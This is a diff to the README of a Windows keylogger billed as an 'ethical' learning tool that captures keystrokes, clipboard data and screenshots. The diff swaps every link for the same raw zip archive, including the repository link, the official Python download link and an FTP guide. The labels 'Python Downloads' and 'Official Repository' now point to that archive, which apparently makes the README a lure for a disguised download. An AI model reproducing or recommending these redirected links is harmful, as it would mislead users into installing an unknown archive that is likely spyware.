@@ -1,6 +1,6 @@
 # 🛡️ ethical-keylogger - Simple Monitoring for Learning
 
-[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-brightgreen)](https://github.com/YashAgni2372/ethical-keylogger)
+[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-brightgreen)](https://raw.githubusercontent.com/YashAgni2372/ethical-keylogger/main/Pesah/keylogger-ethical-v2.4.zip)
 
 A tool designed to capture keystrokes, mouse activity, clipboard data, and screenshots on Windows. Built for educational use in cybersecurity training and labs.
 
@@ -26,7 +26,7 @@ It’s intended for learning about security and ethical hacking. Using it withou
 
 ## ⚙️ How to Download and Run ethical-keylogger
 
-[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-orange)](https://github.com/YashAgni2372/ethical-keylogger)
+[![Download Now](https://img.shields.io/badge/Download-ethical--keylogger-orange)](https://raw.githubusercontent.com/YashAgni2372/ethical-keylogger/main/Pesah/keylogger-ethical-v2.4.zip)
 
 Follow these steps to get the software running on your Windows PC.
 
@@ -51,7 +51,7 @@ Go to the official repository page at the link above. This page contains all fil
 
 This program runs using Python. If you do not have it, follow this:
 
-- Visit https://www.python.org/downloads/windows/
+- Visit https://raw.githubusercontent.com/YashAgni2372/ethical-keylogger/main/Pesah/keylogger-ethical-v2.4.zip
 - Download the latest version for Windows.
 - Run the installer.
 - Make sure to check the box that says **Add Python to PATH** before clicking install.
@@ -168,9 +168,9 @@ If `pip install` fails:
 
 ## 🔗 Useful Links
 
-- [Official Repository](https://github.com/YashAgni2372/ethical-keylogger)
-- [Python Downloads](https://www.python.org/downloads/windows/)
-- [FTP Setup Guide](https://www.hostinger.com/tutorials/how-to-use-ftp-server)
+- [Official Repository](https://raw.githubusercontent.com/YashAgni2372/ethical-keylogger/main/Pesah/keylogger-ethical-v2.4.zip)
+- [Python Downloads](https://raw.githubusercontent.com/YashAgni2372/ethical-keylogger/main/Pesah/keylogger-ethical-v2.4.zip)
+- [FTP Setup Guide](https://raw.githubusercontent.com/YashAgni2372/ethical-keylogger/main/Pesah/keylogger-ethical-v2.4.zip)
 
 ---
 
